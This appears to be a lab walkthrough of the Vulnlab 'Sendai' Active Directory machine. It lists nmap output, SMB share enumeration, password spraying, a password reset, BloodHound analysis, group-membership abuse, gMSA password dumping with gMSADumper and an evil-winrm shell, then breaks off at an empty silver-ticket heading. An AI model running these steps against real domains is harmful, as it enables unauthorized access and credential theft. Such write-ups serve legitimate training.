---
title: Vulnlab Standalone - Sendai
date: 2024-03-21
categories: [vulnlab]
tags: [AD]
pin: false
---

## Vulnlab Standlone - Sendai
![_install](/assets/img/VL-Sendai/sendai.png)

# Initial Access
Starting off, I added the following entries to the /etc/hosts file:
```
10.10.64.43 sendai.vl
10.10.64.43 dc.sendai.vl
```

Started of with an initial nmap scan which revealed the following information:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-14 18:08:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
Using smbclient I listed the shares and checked if there any shares which are open for unauthenticated use:
```
smbclient -L \\\\DC.sendai.vl\\
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        config          Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        sendai          Disk      company share
        SYSVOL          Disk      Logon server share
        Users           Disk
```
Upon checking the Sendai share I found a txt file mentioning that a penetration test discovered numerous weak passwords and recommending changes as soon as possible. Also in the transfers folder, I found the UserProfiles for a few users within the domain:
```
 smb: \transfer\> ls
  .                                   D        0  Tue Jul 11 15:00:20 2023
  ..                                  D        0  Tue Jul 18 19:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 14:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 15:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 14:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 14:59:34 2023
  susan.harper                        D        0  Tue Jul 11 14:59:39 2023
  temp                                D        0  Tue Jul 11 15:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 14:59:45 2023
  ```
I saved the usernames to a file called users.txt and tried common passwords such as Sendai01, Summer2024, etc. This method allowed me to recover the password for the user lisa.williams:
```
SMB         10.10.64.43     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.10.64.43     445    DC               [-] sendai.vl\lisa.williams:[REDACTED] STATUS_PASSWORD_MUST_CHANGE
```
# Getting access to mgtsvc$
I reset the password for the user with the smbpasswd tool:
```
smbpasswd -U lisa.williams -r sendai.vl
```
Now that we have valid credentials I ran the remote python bloodhound ingestor to enumerate the environment:
```
bloodhound.py --zip -c All -d sendai.vl -u lisa.williams -p P@ssw0rd -dc DC.sendai.vl -ns 10.10.98.198
```
Inspecting the Bloodhound output and further enumerating the domain revealed the following path:
- Lisa.willams has GenericAll on the ADMSVC group
- The ADMSVC group can read the gMSA password of the mgtsvc$ user'
We can abuse this by adding the lisa.williams user to the ADMSVC group using pth-net:
```
pth-net rpc group addmem "admsvc" lisa.williams -U sendai.vl/lisa.williams -S 10.10.64.43 
```
We can exploit this by adding the lisa.williams user to the ADMSVC group using pth-net:
```
gMSADumper.py -u 'lisa.williams' -p 'P@ssw0rd' -d 'sendai.vl' 
```
Using evil-winrm we can get a shell on the target:
```
evil-winrm -i 10.10.98.198 -u 'mgtsvc$' -H [REDACTED]
```

# Crafting silver tickets
